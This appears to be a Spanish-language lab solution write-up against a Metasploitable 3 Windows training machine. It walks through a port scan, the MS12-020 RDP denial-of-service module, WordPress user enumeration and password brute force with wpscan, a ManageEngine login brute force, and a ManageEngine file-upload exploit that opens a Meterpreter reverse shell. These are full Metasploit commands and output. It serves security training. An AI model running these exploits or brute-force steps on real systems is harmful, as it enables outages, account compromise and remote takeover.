#Solucionario del Laboratorio 1

TARGET: 192.168.109.174 (METASPLOITABLE 3 WINDOWS)

##  Enumeración de servicios

Ejecutamos scan
```
scan 192.168.109.174
```
Estos son los resultados

```
scan 192.168.109.174
[*] OS based on TTL
Windows
[*] Full TCP Scan
Open ports: 139,135,22,8022,8019,8027,445,1617,3306,3389,3700,4848,5985,7676,8009,8020,8028,8031,8032,8383,8181,8282,8080,8443,8444,8585,8686,8484,9200,9300,49321,47001,49210,49152,49155,49154,49156,49153,49256,49266,49268,49177,49178,49317,49320,49322
```

##  Solucionario

### Pregunta 1 	Explote la vulnerabilidad MS12-020, adjunte evidencia 

Se revisa de que trata la vulnerabilidad

![image](https://user-images.githubusercontent.com/50930193/173705182-41f11b11-ec3f-48c7-bc3e-790eed6235a4.png)

Se revisa que se trata de la eplotación del Puerto 3389 – RDP y que permite denegación de servicio (DOS) Explotación DoS dicha
vulnerabilidad puede aprovechar de una condición de denegación de servicio en la máquina remota. 

Metasploit tiene un par de módulos para probar y explotar esta vulnerabilidad. Veamos
```
msf6 > search MS12-020

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker
   1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/rdp/ms12_020_maxchannelids

msf6 > use 0
msf6 auxiliary(scanner/rdp/ms12_020_check) > show options

Module options (auxiliary/scanner/rdp/ms12_020_check):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    3389             yes       Remote port running RDP (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/rdp/ms12_020_check) > set RHOSTS 192.168.109.174
RHOSTS => 192.168.109.174
msf6 auxiliary(scanner/rdp/ms12_020_check) > run

[+] 192.168.109.174:3389  - 192.168.109.174:3389 - The target is vulnerable.
[*] 192.168.109.174:3389  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/rdp/ms12_020_check) > back
msf6 > use 1
msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > show options

Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   3389             yes       The target port (TCP)

msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set RHOSTS 192.168.109.174
RHOSTS => 192.168.109.174
msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
[*] Running module against 192.168.109.174

[*] 192.168.109.174:3389 - 192.168.109.174:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
[*] 192.168.109.174:3389 - 192.168.109.174:3389 - 210 bytes sent
[*] 192.168.109.174:3389 - 192.168.109.174:3389 - Checking RDP status...
[+] 192.168.109.174:3389 - 192.168.109.174:3389 seems down
[*] Auxiliary module execution completed
```

![image](https://user-images.githubusercontent.com/50930193/173705778-3e54a43d-5613-4906-8e40-a2a5bd01c129.png)

![image](https://user-images.githubusercontent.com/50930193/173705653-ced0f1cc-fb9c-41c0-99d9-fec86da193f9.png)

### Pregunta 2: Explote el servicio del puerto 8585, el objetivo es ingresar al wordpress en entorno web


Desde la página de inicio http://192.168.109.174:8585, si hace clic en el enlace de wordpress debajo de Sus proyectos , 
verá el sitio web de WordPress ejecutándose en el servidor de destino y se redirigirá a este enlace http://192.168.109.174:8585/wordpress/

![image](https://user-images.githubusercontent.com/50930193/173706325-c9756505-fb91-4500-b66b-9c99a97c9209.png)

A su vez, el enlace a la página de inicio de sesión lo llevará a /wordpress/wp-login.php

![image](https://user-images.githubusercontent.com/50930193/173706432-02f369ce-5fde-4042-bec7-9c0f6d0756db.png)

Ahora vamos a tratar de conseguir por fueza bruta las credenciales

### TIP: Use sus listas de palabras personalizadas para acelerar el proceso

Fuerza bruta con wpscan
```
wpscan --url http://192.168.109.174:8585/wordpress --enumerate u                                                                                                                               4 ⨯
WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically loaded 2.9.13
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.109.174:8585/wordpress/ [192.168.109.174]
[+] Started: Tue Jun 14 19:43:43 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2
 |  - X-Powered-By: PHP/5.3.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.109.174:8585/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.109.174:8585/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Full Path Disclosure found: http://192.168.109.174:8585/wordpress/wp-includes/rss-functions.php
 | Interesting Entry: C:\wamp\www\wordpress\wp-includes\rss-functions.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://www.owasp.org/index.php/Full_Path_Disclosure

[+] Upload directory has listing enabled: http://192.168.109.174:8585/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.109.174:8585/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.1 identified (Insecure, released on 2016-09-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.109.174:8585/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=4.6.1</generator>
 |  - http://192.168.109.174:8585/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.6.1</generator>

[+] WordPress theme in use: twentyfourteen
 | Location: http://192.168.109.174:8585/wordpress/wp-content/themes/twentyfourteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://192.168.109.174:8585/wordpress/wp-content/themes/twentyfourteen/readme.txt
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: http://192.168.109.174:8585/wordpress/wp-content/themes/twentyfourteen/style.css?ver=4.6.1
 | Style Name: Twenty Fourteen
 | Style URI: https://wordpress.org/themes/twentyfourteen/
 | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.109.174:8585/wordpress/wp-content/themes/twentyfourteen/style.css?ver=4.6.1, Match: 'Version: 1.8'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <=========================================================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] user
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] vagrant
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 14 19:43:54 2022
[+] Requests Done: 59
[+] Cached Requests: 6
[+] Data Sent: 21.862 KB
[+] Data Received: 278.334 KB
[+] Memory used: 180.484 MB
[+] Elapsed time: 00:00:11

```
Se confirma que tenemos 4 usuarios

![image](https://user-images.githubusercontent.com/50930193/173707353-1645fc02-e094-46e7-94bd-2f25a2d774df.png)

Ahora podemos utilizar diversos metodos para hallar la clave, primero crear un archivo de usuarios:
![image](https://user-images.githubusercontent.com/50930193/173707779-9221cf48-b5ca-418e-be39-981cc11d965c.png)

Y luego con ello ejecutamos la fuerza bruta
```
wpscan --url http://192.168.109.174:8585/wordpress -U users.txt -P examen_passwords.txt 
```
![image](https://user-images.githubusercontent.com/50930193/173708074-6e166e1b-24dd-4449-9165-c4f86ada3f88.png)

Finalmente probemos ingresando 

![image](https://user-images.githubusercontent.com/50930193/173708208-4c5925e2-eee3-4866-ad14-29ffdf6b7265.png)

### Pregunta 3: Explote el servicio 8020

Navegando en ese puero ingresamos y vemos que esta el ManageEngine

![image](https://user-images.githubusercontent.com/50930193/173708857-1e798c37-2f74-401b-bfb8-89d087e66651.png)

Desde MSFConsole buscamos si hay modulos asociados
```
search manageengine desktop central
```
Este es el resultado
```
Matching Modules
================

   #  Name                                                       Disclosure Date  Rank       Check  Description
   -  ----                                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   1  exploit/windows/http/manageengine_connectionid_write       2015-12-14       excellent  Yes    ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
   2  auxiliary/admin/http/manage_engine_dc_create_admin         2014-12-31       normal     No     ManageEngine Desktop Central Administrator Account Creation
   3  exploit/windows/http/desktopcentral_file_upload            2013-11-11       excellent  Yes    ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload
   4  exploit/windows/http/desktopcentral_deserialization        2020-03-05       excellent  Yes    ManageEngine Desktop Central Java Deserialization
   5  auxiliary/scanner/http/manageengine_desktop_central_login                   normal     No     ManageEngine Desktop Central Login Utility
   6  exploit/windows/http/desktopcentral_statusupdate_upload    2014-08-31       excellent  Yes    ManageEngine Desktop Central StatusUpdate Arbitrary File Upload
```
Podemos elegir el el módulo 5 para saber las credenciales de la aplicacion manage engine o usar el módulo 1 para ingresar al sistema operativo que contiene la aplicación manage engine, elijamos primero el módulo 5 y luego el módulo 1
```

msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > show options

Module options (auxiliary/scanner/http/manageengine_desktop_central_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8020             yes       The target port (TCP)
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
   VHOST                              no        HTTP server virtual host

msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > set rhosts 192.168.109.174
rhosts => 192.168.109.174
msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > set USER_FILE /root/Desktop/examen
USER_FILE => /root/Desktop/examen
msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > set USER_FILE /root/Desktop/examen/examen_users.txt
USER_FILE => /root/Desktop/examen/examen_users.txt
msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > set PASS_FILE /root/Desktop/examen/examen_passwords.txt
PASS_FILE => /root/Desktop/examen/examen_passwords.txt
msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/http/manageengine_desktop_central_login) > run

[+] 192.168.109.174:8020 - Success: 'admin:admin'

```
![image](https://user-images.githubusercontent.com/50930193/173709413-e2186061-d211-415f-8fec-cbf09b028a8c.png)

Intentamos ingresando con esas credenciales

![image](https://user-images.githubusercontent.com/50930193/175658061-529e6d47-e90c-4b71-bc28-22e2e4669af2.png)

Ahora elijamos el módulo 1
```

msf6 exploit(windows/http/manageengine_connectionid_write) > info

       Name: ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
     Module: exploit/windows/http/manageengine_connectionid_write
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-12-14
msf6 exploit(windows/http/manageengine_connectionid_write) > set rhosts 192.168.109.174
rhosts => 192.168.109.174
msf6 exploit(windows/http/manageengine_connectionid_write) > run

[*] Started reverse TCP handler on 192.168.109.132:4444 
[*] Creating JSP stager
[*] Uploading JSP stager KqNsx.jsp...
[*] Executing stager...
[*] Sending stage (175174 bytes) to 192.168.109.174
[+] Deleted ../webapps/DesktopCentral/jspf/KqNsx.jsp
[*] Meterpreter session 1 opened (192.168.109.132:4444 -> 192.168.109.174:49388) at 2022-06-24 15:45:53 -0400

meterpreter > shell
Process 6064 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\DesktopCentral_Server\bin>hostname
hostname
vagrant-2008R2


```
![image](https://user-images.githubusercontent.com/50930193/175657258-ba7f5fc5-a42c-4e0e-95ba-b4ef84e714e4.png)
